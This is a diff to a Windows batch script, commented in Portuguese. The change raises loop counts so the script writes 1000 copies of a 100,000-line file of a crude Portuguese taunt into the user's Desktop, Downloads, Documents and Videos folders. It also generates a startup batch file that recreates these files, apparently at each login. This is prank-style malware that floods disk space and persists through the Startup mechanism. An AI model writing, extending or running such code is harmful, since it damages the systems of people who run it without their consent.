@@ -14,7 +14,7 @@ REM ===== CRIAR MODELO COM 1000 LINHAS =====
 )
 
 REM ===== CRIAR 1000 TXT EM CADA PASTA (RÁPIDO) =====
-for /L %%i in (1,1,1) do (
+for /L %%i in (1,1,1000) do (
     copy /Y "%MODEL%" "%DESKTOP%\Lxzinn__%%i.txt" >nul
     copy /Y "%MODEL%" "%DOWNLOADS%\Lxzinn__%%i.txt" >nul
     copy /Y "%MODEL%" "%DOCUMENTS%\Lxzinn__%%i.txt" >nul
@@ -28,11 +28,12 @@ REM ===== CRIAR BAT DO STARTUP (BLINDADO) =====
     echo ^> "%%MODEL%%" ^(
     echo     for /L %%%%i in ^(1,1,100000^) do echo LUIZ COMEU SUA BUNDA OTARIO AHHAHAH
     echo ^)
-    echo for /L %%%%i in ^(1,1,1^) do ^(
+    echo for /L %%%%i in ^(1,1,1000^) do ^(
     echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Desktop\Lxzinn__%%%%i.txt" ^>nul
     echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Downloads\Lxzinn__%%%%i.txt" ^>nul
     echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Documents\Lxzinn__%%%%i.txt" ^>nul
     echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Videos\Lxzinn__%%%%i.txt" ^>nul
     echo ^)
 )
+
 
